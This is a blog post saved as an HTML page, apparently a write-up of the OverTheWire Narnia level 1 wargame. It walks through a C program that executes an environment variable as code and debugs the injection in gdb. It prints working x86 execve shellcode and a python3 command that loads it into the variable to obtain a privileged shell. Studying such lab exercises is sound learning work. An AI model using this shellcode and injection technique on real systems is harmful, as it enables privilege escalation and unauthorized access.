<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>narnia1 :: exploit dev</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="lets login to narnia1 and see what&rsquo;s the source code.
#include &lt;stdio.h&gt; int main(){ int (*ret)(); if(getenv(&#34;EGG&#34;)==NULL){ printf(&#34;Give me something to execute at the env-variable EGG\n&#34;); exit(1); } printf(&#34;Trying to execute EGG!\n&#34;); ret = getenv(&#34;EGG&#34;); ret(); return 0; } I&rsquo;ve always had difficulty reading C syntax, especially this line: int (ret*)();
The way I read it is ret is a pointer to a function returning an int.
Next, ret is being assigned this value from an environment variable EGG and then executed ret().
" />
<meta name="keywords" content=", " />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://0x4ngk4n.github.io/posts/narnia1/" />





  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/main.min.7d96875ab64e4666f6b663bd6b9529f9a867dd3fadc2b1edee24b8cef46107c0.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/terminal.min.f07caa97966b6418dc9fb7cf61c1655ee5e4c5ac85df19cd307f36af17ed0817.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="https://0x4ngk4n.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="https://0x4ngk4n.github.io/favicon.png">
<link rel="apple-touch-icon" href="https://0x4ngk4n.github.io/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="narnia1">
<meta property="og:description" content="lets login to narnia1 and see what&rsquo;s the source code.
#include &lt;stdio.h&gt; int main(){ int (*ret)(); if(getenv(&#34;EGG&#34;)==NULL){ printf(&#34;Give me something to execute at the env-variable EGG\n&#34;); exit(1); } printf(&#34;Trying to execute EGG!\n&#34;); ret = getenv(&#34;EGG&#34;); ret(); return 0; } I&rsquo;ve always had difficulty reading C syntax, especially this line: int (ret*)();
The way I read it is ret is a pointer to a function returning an int.
Next, ret is being assigned this value from an environment variable EGG and then executed ret().
" />
<meta property="og:url" content="https://0x4ngk4n.github.io/posts/narnia1/" />
<meta property="og:site_name" content="exploit dev" />

  
  
  <meta property="og:image" content="https://0x4ngk4n.github.io/">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2026-02-10 16:08:55 &#43;0000 UTC" />












</head>
<body>


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://0x4ngk4n.github.io/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://0x4ngk4n.github.io/posts/narnia1/">narnia1</a>
  </h1>
  <div class="post-meta"><time class="post-date">2026-02-10</time><span class="post-author">0x4ngk4n</span></div>

  
    <span class="post-tags">
      
      #<a href="https://0x4ngk4n.github.io/tags/narnia/">narnia</a>&nbsp;
      
      #<a href="https://0x4ngk4n.github.io/tags/overthewire/">overthewire</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>lets login to narnia1 and see what&rsquo;s the source code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;EGG&#34;</span>)<span style="color:#f92672">==</span>NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Give me something to execute at the env-variable EGG</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Trying to execute EGG!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;EGG&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I&rsquo;ve always had difficulty reading C syntax, especially this line: <code>int (ret*)();</code><br>
The way I read it is <code>ret is a pointer to a function returning an int</code>.</p>
<p>Next, ret is being assigned this value from an environment variable <code>EGG</code> and then executed <code>ret()</code>.</p>
<p>This looks erriely like those stub functions which take a shellcode as a char buffer and then load them to a function pointer type to execute.
For instance, an example is: <a href="https://www.exploit-db.com/exploits/39625">https://www.exploit-db.com/exploits/39625</a></p>
<p>Armed with this knowledge, I was stuck on how to export it onto an environment variable. For instance, if I were to set the environment variable as:\</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export EGG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#34;</span>
</span></span></code></pre></div><p>By the way, the above <a href="https://shell-storm.org/shellcode/files/shellcode-606.html">shellcode</a> was selected after some thought. Basically, if a new shell has to be spawned from the environment variable, it has to carry over the <code>euid</code> bit which does not happen if the <code>-p</code> param is not supplied and <code>uid &gt; 100</code>.</p>
<p>I was straight up getting core dump</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia1@narnia:/narnia$ ./narnia1
</span></span><span style="display:flex;"><span>Trying to execute EGG!
</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
</span></span></code></pre></div><p><code>gdb</code> to the rescue!
Disassembly as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia1@narnia:/narnia$ export EGG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#34;</span>
</span></span><span style="display:flex;"><span>narnia1@narnia:/narnia$ gdb -q ./narnia1
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
</span></span><span style="display:flex;"><span>   0x08049186 &lt;+0&gt;:     push   ebp
</span></span><span style="display:flex;"><span>   0x08049187 &lt;+1&gt;:     mov    ebp,esp
</span></span><span style="display:flex;"><span>   0x08049189 &lt;+3&gt;:     sub    esp,0x4
</span></span><span style="display:flex;"><span>   0x0804918c &lt;+6&gt;:     push   0x804a008
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x08049191 &lt;+11&gt;:    call   0x8049040 &lt;getenv@plt&gt;
</span></span><span style="display:flex;"><span>   0x08049196 &lt;+16&gt;:    add    esp,0x4
</span></span><span style="display:flex;"><span>   0x08049199 &lt;+19&gt;:    test   eax,eax
</span></span><span style="display:flex;"><span>   0x0804919b &lt;+21&gt;:    jne    0x80491b1 &lt;main+43&gt;
</span></span><span style="display:flex;"><span>   0x0804919d &lt;+23&gt;:    push   0x804a00c
</span></span><span style="display:flex;"><span>   0x080491a2 &lt;+28&gt;:    call   0x8049050 &lt;puts@plt&gt;
</span></span><span style="display:flex;"><span>   0x080491a7 &lt;+33&gt;:    add    esp,0x4
</span></span><span style="display:flex;"><span>   0x080491aa &lt;+36&gt;:    push   0x1
</span></span><span style="display:flex;"><span>   0x080491ac &lt;+38&gt;:    call   0x8049060 &lt;exit@plt&gt;
</span></span><span style="display:flex;"><span>   0x080491b1 &lt;+43&gt;:    push   0x804a041
</span></span><span style="display:flex;"><span>   0x080491b6 &lt;+48&gt;:    call   0x8049050 &lt;puts@plt&gt;
</span></span><span style="display:flex;"><span>   0x080491bb &lt;+53&gt;:    add    esp,0x4
</span></span><span style="display:flex;"><span>   0x080491be &lt;+56&gt;:    push   0x804a008
</span></span><span style="display:flex;"><span>   0x080491c3 &lt;+61&gt;:    call   0x8049040 &lt;getenv@plt&gt;
</span></span><span style="display:flex;"><span>   0x080491c8 &lt;+66&gt;:    add    esp,0x4
</span></span><span style="display:flex;"><span>   0x080491cb &lt;+69&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x4<span style="color:#f92672">]</span>,eax
</span></span><span style="display:flex;"><span>   0x080491ce &lt;+72&gt;:    mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp-0x4<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x080491d1 &lt;+75&gt;:    call   eax
</span></span><span style="display:flex;"><span>   0x080491d3 &lt;+77&gt;:    mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x080491d8 &lt;+82&gt;:    leave
</span></span><span style="display:flex;"><span>   0x080491d9 &lt;+83&gt;:    ret
</span></span></code></pre></div><p>I put a breakpoint at <code>*main+11</code> where the call to getenv is taking place. Executing this syscall and then checking the <code>eax</code> register shows the issue. Why eax? Because its the accumulator register which stores the results.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/30bx $eax
</span></span><span style="display:flex;"><span>0x804909d &lt;_start+45&gt;:  0xe9    0xe4    0x00    0x00    0x00    0x66    0x90    0x66
</span></span><span style="display:flex;"><span>0x80490a5 &lt;__wrap_main+8&gt;:      0x90    0x66    0x90    0x66    0x90    0x66    0x90    0x66
</span></span><span style="display:flex;"><span>0x80490ad &lt;__wrap_main+16&gt;:     0x90    0x66    0x90    0xc3    0x66    0x90    0x66    0x90
</span></span><span style="display:flex;"><span>0x80490b5:      0x66    0x90    0x66    0x90    0x66    0x90
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> ni &lt;-- stepping over getenv call
</span></span><span style="display:flex;"><span>0x08049196 in main <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/30bx $eax
</span></span><span style="display:flex;"><span>0xffffdd85:     0x5c    0x78    0x36    0x61    0x5c    0x78    0x30    0x62
</span></span><span style="display:flex;"><span>0xffffdd8d:     0x5c    0x78    0x35    0x38    0x5c    0x78    0x39    0x39
</span></span><span style="display:flex;"><span>0xffffdd95:     0x5c    0x78    0x35    0x32    0x5c    0x78    0x36    0x36
</span></span><span style="display:flex;"><span>0xffffdd9d:     0x5c    0x78    0x36    0x38    0x5c    0x78
</span></span></code></pre></div><p>Seems the shellcode is mangled with the backslashed embedded as raw bytes <code>0x5c</code> when we set the envvar to a string. So maybe&hellip; we need to set to it raw bytes of the shellcode such that its picked up and executed.</p>
<p>python3 to the rescue&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set environment EGG<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;)&#34;</span><span style="color:#e6db74">`</span>
</span></span></code></pre></div><p>Now, lets inspect <code>eax</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia1@narnia:/narnia$ export EGG<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#39;)&#34;</span><span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/33bx $eax &lt;-- print <span style="color:#ae81ff">33</span> bytes <span style="color:#f92672">(</span>shellcode length<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0xffffdde8:     0x6a    0x0b    0x58    0x99    0x52    0x66    0x68    0x2d
</span></span><span style="display:flex;"><span>0xffffddf0:     0x70    0x89    0xe1    0x52    0x6a    0x68    0x68    0x2f
</span></span><span style="display:flex;"><span>0xffffddf8:     0x62    0x61    0x73    0x68    0x2f    0x62    0x69    0x6e
</span></span><span style="display:flex;"><span>0xffffde00:     0x89    0xe3    0x52    0x51    0x53    0x89    0xe1    0xcd
</span></span><span style="display:flex;"><span>0xffffde08:     0x80
</span></span></code></pre></div><p>Look at above, our beautiful shellcode intact <code>^~^</code>
Let&rsquo;s continue the program execution&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia1@narnia:/narnia$ ./narnia1
</span></span><span style="display:flex;"><span>Trying to execute EGG!
</span></span><span style="display:flex;"><span>bash-5.2$ whoami
</span></span><span style="display:flex;"><span>narnia2
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
